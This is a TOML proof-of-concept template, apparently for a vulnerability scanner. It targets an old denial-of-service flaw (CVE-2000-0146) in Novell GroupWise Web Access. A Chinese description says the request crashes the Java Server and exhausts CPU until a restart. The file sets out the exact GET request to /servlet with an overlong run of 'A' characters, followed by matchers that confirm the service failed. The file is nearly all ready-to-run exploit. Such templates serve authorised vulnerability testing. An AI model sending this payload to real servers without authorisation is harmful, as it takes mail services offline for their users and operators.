[info]
author = "AVE"
description = "通过向 GroupWise Java Server 的 /servlet 路径发送超长 URI（200+ 字符），可触发 Java Server 异常崩溃，导致 Web Access 服务不可用。发送后服务器 Java.nlm 进程将耗尽 CPU 资源，需重启恢复。"
id = "POC-AVE-2000-0131"
name = "Novell GroupWise Web Access Enhancement Pack 拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0146",
    "novell",
    "groupwise",
    "dos",
]
vuln_id = [
    "CVE-2000-0146",
    "AVE-2000-0131",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error",
    "Exception",
    "unavailable",
    "Service Temporarily Unavailable",
]
